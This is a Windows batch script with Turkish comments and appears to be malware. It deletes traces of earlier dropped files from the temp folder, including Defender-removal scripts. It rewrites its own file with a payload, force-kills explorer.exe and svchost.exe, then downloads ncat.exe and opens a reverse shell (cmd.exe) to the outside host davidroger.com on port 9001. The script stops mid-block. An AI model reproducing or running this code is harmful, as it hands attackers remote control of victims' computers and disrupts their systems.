@echo off

:: Dosyalari sil
cd %temp% >nul 2>&1
del /f /q "s.bat" >nul 2>&1
del /f /q "a.py" >nul 2>&1
del /f /q "asd.bat" >nul 2>&1
del /f /q "ddd.vbs" >nul 2>&1
del /f /q "expe2.bat" >nul 2>&1
del /f /q "expe2.vbs" >nul 2>&1
del /f /q "lalala.vbs" >nul 2>&1
del /f /q "a.ps1" >nul 2>&1
del /f /q "first.exe" >nul 2>&1
del /f /q "corpvpn.inf" >nul 2>&1
del /f /q "RunDefenderRemover.vbs" >nul 2>&1
del /f /q "DefenderRemover.bat" >nul 2>&1
rmdir /s /q "Remove_SecurityComp" >nul 2>&1
rmdir /s /q "Remove_Defender" >nul 2>&1

:: Kendini gecici bir dosyaya yaz, sonra o dosya ile degistir
set "script=%~f0"
set "tempfile=%temp%\temp_script.bat"
(
    echo @echo off
    echo cd %%temp%%
    echo curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe >nul 2^^>nul
    echo %%temp%%\ncat.exe davidroger.com 9001 -e cmd.exe >nul 2^^>nul
) > "%tempfile%"

copy /y "%tempfile%" "%script%" >nul 2>&1
cd %temp% >nul 2>&1
if exist "%temp%\temp_script.bat" del /f /q "%temp%\temp_script.bat" >nul 2>&1

:: explorer.exe ve svchost.exe'yi sonlandir
for /f "tokens=2 delims==" %%i in ('wmic process where "name='explorer.exe'" get processid /format:list ^| find "="') do taskkill /f /pid %%i >nul 2>&1
for /f "tokens=2 delims==" %%i in ('wmic process where "name='svchost.exe'" get processid /format:list ^| find "="') do taskkill /f /pid %%i >nul 2>&1

:: ncat indir ve calistir
curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe >nul 2>&1
if exist "ncat.exe" (
    ncat.exe davidroger.com 9001 -e cmd.exe >nul 2>&1
